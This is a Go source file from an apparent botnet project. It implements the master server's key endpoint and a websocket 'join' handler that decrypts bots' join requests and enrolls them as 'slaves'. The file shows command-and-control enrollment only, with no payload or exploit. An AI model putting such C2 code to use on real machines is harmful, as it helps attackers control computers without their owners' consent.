package master

import (
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"log"
	"net/http"

	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/gorilla/websocket"
)

const (
	// KeyEndpoint is where the master public key is served
	KeyEndpoint = "/key"
	// JoinEndpoint is where new net users will register
	JoinEndpoint = "/join"
)

// KeyResponse is the response of the key endpoint
type KeyResponse struct {
	Key string `json:"key"`
}

// JoinRequest is expected to be found in an encrypted header
type JoinRequest struct {
	Key string `json:"key"`
}

func (c *Config) keyHandler(w http.ResponseWriter, r *http.Request) {
	respBytes, err := json.Marshal(&KeyResponse{Key: c.botMaster.masterPubKey})
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("could not return public key"))
		return
	}
	w.WriteHeader(http.StatusOK)
	w.Write(respBytes)
	return
}

func (c *Config) joinHandler(w http.ResponseWriter, r *http.Request) {
	// upgrade protocol to websockets connection
	upgrader := websocket.Upgrader{ReadBufferSize: 1024, WriteBufferSize: 1024}
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("could not upgrade to WS connection"))
		return
	}
	// receive join request in first message from socket
	JoinRequest, err := completeHandshake(conn, c.botMaster.masterPrivKey)
	if err != nil {
		log.Printf("received join request but failed to complete net handshake: %s", err)
		return
	}
	// create new slave
	slave, err := NewSlaveCtrl(c.botMaster, JoinRequest.Key, conn)
	if err != nil {
		log.Printf("could not create new slave controller for new slave: %s", err)
		return
	}
	c.botMaster.EnrolSlave(slave)
}

func completeHandshake(conn *websocket.Conn, masterDecryptionKey *rsa.PrivateKey) (*JoinRequest, error) {
	// first message completes the handshake, when the slave provides a JSON join
	// request, which has been encrypted with the master's public key
	_, encryptedMessage, err := conn.ReadMessage()
	if err != nil {
		if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
			return nil, fmt.Errorf("WS connection was closed unexpectedly: %s", err)
		}
	}
	jsonMsg, err := encryption.DecryptMessage(encryptedMessage, masterDecryptionKey)
	if err != nil {
		return nil, fmt.Errorf("could not decrypt message from new slave: %s", err)
	}
	var jr *JoinRequest
	if err := json.Unmarshal(jsonMsg, &jr); err != nil {
		return nil, fmt.Errorf("could not unmarshal message from new slavde slave: %s", err)
	}
	return jr, nil
}
